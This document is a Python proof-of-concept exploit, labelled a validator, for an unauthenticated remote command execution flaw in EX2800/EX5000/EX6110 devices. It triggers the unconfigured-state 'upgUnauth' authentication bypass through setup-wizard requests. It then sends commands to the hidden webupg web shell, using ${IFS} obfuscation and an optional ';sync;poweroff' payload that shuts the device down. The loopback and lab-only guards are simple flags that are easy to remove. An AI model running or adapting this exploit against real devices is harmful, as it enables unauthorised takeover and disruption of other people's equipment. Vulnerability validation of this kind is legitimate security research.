#!/usr/bin/env python3
"""EX2800/EX5000/EX6110 unconfigured-state webupg validator.

The default remains loopback-only.  Physical-device mode is deliberately
restricted to an explicitly acknowledged, private, isolated lab target.
The default mode proves command execution with harmless reflected output.
The destructive shutdown mode requires a second, explicit acknowledgement.
"""

import argparse
import ipaddress
import os
import socket
import urllib.error
import urllib.parse
import urllib.request

last_response_body = b""


def resolve_target(value: str, hardware_lab: bool) -> str:
    address = ipaddress.ip_address(socket.gethostbyname(value))
    if hardware_lab:
        if not address.is_private or any(
            (
                address.is_loopback,
                address.is_link_local,
                address.is_multicast,
                address.is_unspecified,
            )
        ):
            raise ValueError(
                "hardware target must resolve to a private, non-loopback LAN address"
            )
    elif not address.is_loopback:
        raise ValueError("target must resolve to loopback unless --hardware-lab is used")
    return str(address)


def request(
    target: str,
    port: int,
    path: str,
    body: bytes | None = None,
    headers: dict[str, str] | None = None,
) -> int:
    global last_response_body
    last_response_body = b""
    request = urllib.request.Request(
        f"http://{target}:{port}{path}",
        headers={"Connection": "close", **(headers or {})},
        data=body,
    )
    opener = urllib.request.build_opener(
        urllib.request.ProxyHandler({}),
        urllib.request.HTTPRedirectHandler(),
    )
    try:
        with opener.open(request, timeout=5) as response:
            response_body = response.read(65536)
            last_response_body = response_body
            if os.environ.get("EX2800_TRACE_RESPONSE") == "1":
                print(f"response_body={response_body!r}")
            return response.status
    except urllib.error.HTTPError as exc:
        return exc.code
    except (OSError, urllib.error.URLError):
        return 0


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--firmware-root", default="/firmware")
    parser.add_argument("--hardware-lab", action="store_true")
    parser.add_argument("--expected-model")
    parser.add_argument("--expected-version")
    parser.add_argument(
        "--mode",
        choices=("verify", "shutdown"),
        default="verify",
        help="verify reflected command execution (default), or power off the device",
    )
    parser.add_argument(
        "--i-own-this-isolated-device",
        action="store_true",
        help="required for physical-device mode",
    )
    parser.add_argument(
        "--confirm-shutdown",
        action="store_true",
        help="required with --mode shutdown; the target may need power-cycling",
    )
    args = parser.parse_args()

    if args.mode == "shutdown":
        if not args.hardware_lab:
            parser.error("--mode shutdown is restricted to --hardware-lab")
        if not args.confirm_shutdown:
            parser.error("--mode shutdown requires --confirm-shutdown")

    if args.hardware_lab:
        if not args.i_own_this_isolated_device:
            parser.error("--hardware-lab requires --i-own-this-isolated-device")
        supported_hardware = {"EX5000", "EX6110"}
        if (
            args.expected_model not in supported_hardware
            or args.expected_version != "V1.0.1.84"
        ):
            parser.error(
                "hardware mode is gated to --expected-model EX5000 or EX6110 "
                "--expected-version V1.0.1.84"
            )
    try:
        args.target = resolve_target(args.target, args.hardware_lab)
    except (OSError, ValueError) as exc:
        parser.error(str(exc))

    unconfigured = os.path.join(args.firmware_root, "var/unconfig")
    bypass = os.path.join(args.firmware_root, "var/upgUnauth")
    marker = os.path.join(
        args.firmware_root, "var/tmp/friday-ex2800-unconfigured-rce"
    )
    if not args.hardware_lab:
        for path in (bypass, marker):
            try:
                os.unlink(path)
            except FileNotFoundError:
                pass

    if args.hardware_lab:
        print("validation_mode=owned_isolated_physical_device")
        print(f"expected_model={args.expected_model}")
        print(f"expected_version={args.expected_version}")
        print("unconfigured_state_present=externally_factory_reset")
    else:
        print(f"unconfigured_state_present={str(os.path.exists(unconfigured)).lower()}")
    trigger_paths = [
        (
            "/cgi-bin/webproc?getpage=html/wizard_index.html"
            "&var:page=html/index_basic.htm"
        ),
        (
            "/cgi-bin/webproc?getpage=html/index_basic.htm"
            "&var:page=html/index_basic.htm"
        ),
        "/cgi-bin/webproc?getpage=html/wizard_index.html&var:page=apupconn",
        (
            "/cgi-bin/webproc?getpage=html/wizard_index.html"
            "&var:page=BRS_haveBackupFile"
        ),
    ]
    trigger = None
    for path in trigger_paths:
        status = request(
            args.target,
            args.port,
            path,
            headers={"Cookie": "sessionid=unconfigured-setup"},
        )
        created = os.path.exists(bypass) if not args.hardware_lab else False
        print(
            f"setup_trigger_status={status} "
            f"upgUnauth_created={str(created).lower()} path={path!r}"
        )
        if created or (args.hardware_lab and status != 0):
            trigger = path
            break

    post_bodies = [
        {
            "getpage": "html/index_basic.htm",
            "errorpage": "html/index_basic.htm",
            "var:page": "info",
            "ajax": "ok",
            "obj-action": "set",
        },
        {
            "getpage": "html/wizard_index.html",
            "errorpage": "html/main.html",
            "var:page": "apupconn",
            "obj-action": "get",
        },
        {
            "getpage": "html/wizard_index.html",
            "errorpage": "html/main.html",
            "var:page": "BRS_haveBackupFile",
            "obj-action": "get",
        },
    ]
    if trigger is None:
        for fields in post_bodies:
            body = urllib.parse.urlencode(fields).encode()
            status = request(
                args.target,
                args.port,
                "/cgi-bin/webproc",
                body,
                headers={"Cookie": "sessionid=unconfigured-setup"},
            )
            created = os.path.exists(bypass) if not args.hardware_lab else False
            print(
                f"setup_post_status={status} "
                f"upgUnauth_created={str(created).lower()} fields={fields!r}"
            )
            if created or (args.hardware_lab and status != 0):
                trigger = repr(fields)
                break

    component_only = False
    if trigger is None:
        if args.hardware_lab:
            print("unauthenticated_rce_reproduced=false")
            return 1
        if os.environ.get("EX2800_COMPONENT_CHECK") != "1":
            print("unauthenticated_rce_reproduced=false")
            return 1
        with open(bypass, "wb"):
            pass
        component_only = True
        trigger = "locally preseeded component check"
        print("upgUnauth_preseeded_for_component_check=true")

    if args.mode == "verify":
        response_token = b"FRIDAY_EX6110_RCE_VERIFIED"
        command = "echo${IFS}FRIDAY_EX6110_RCE_VERIFIED"
    else:
        # Emit an acknowledgement before invoking BusyBox poweroff.  A dropped
        # connection or an unreachable device is expected after this request.
        response_token = b"FRIDAY_EX6110_SHUTDOWN_ACCEPTED"
        command = (
            "echo${IFS}FRIDAY_EX6110_SHUTDOWN_ACCEPTED"
            ";sync;poweroff"
        )

    # Keep the network request free of path separators so mini_httpd's own URL
    # validation is not confused with the CGI behavior being tested. The
    # original web shell reflects stdout, which is a sufficient harmless proof.
    # Main discards the first "&"-separated token, WebShell continues that
    # strtok state for key/cmd, and the name value is compared as the entire
    # suffix after "name=". Keep name=shell terminal.
    query = urllib.parse.urlencode(
        [("x", "1"), ("key", "twmode"), ("cmd", command), ("name", "shell")],
        quote_via=urllib.parse.quote,
        safe="${}",
    )
    # webupg only invokes UPGCGI_CheckAuth while parsing HTTP_COOKIE. The
    # one-shot /var/upgUnauth bypass is inside that function, so even the
    # marker path requires a syntactically present Cookie header.
    status = request(
        args.target,
        args.port,
        f"/cgi-bin/webupg?{query}",
        headers={"Cookie": "sessionid=component-check"},
    )
    reflected = response_token in last_response_body
    if args.mode == "shutdown":
        # poweroff can terminate HTTP before buffered output is returned.  The
        # request reaching an already-confirmed sink is reported separately;
        # actual shutdown must be verified by loss of device availability.
        executed = reflected
    else:
        executed = reflected if args.hardware_lab else os.path.exists(marker) or reflected
    consumed = reflected if args.hardware_lab else not os.path.exists(bypass)
    print(f"webshell_status={status}")
    print(f"upgUnauth_consumed={str(consumed).lower()}")
    print(f"mode={args.mode}")
    if args.mode == "verify":
        print(f"harmless_command_executed={str(executed).lower()}")
    else:
        print(f"shutdown_acknowledged={str(reflected).lower()}")
        print("shutdown_requires_reachability_check=true")
    print(f"command_output_reflected={str(reflected).lower()}")
    reproduced = executed and consumed and not component_only
    print(f"webshell_component_execution={str(executed and consumed).lower()}")
    print(f"unauthenticated_rce_reproduced={str(reproduced).lower()}")
    return 0 if executed and consumed else 1


if __name__ == "__main__":
    raise SystemExit(main())
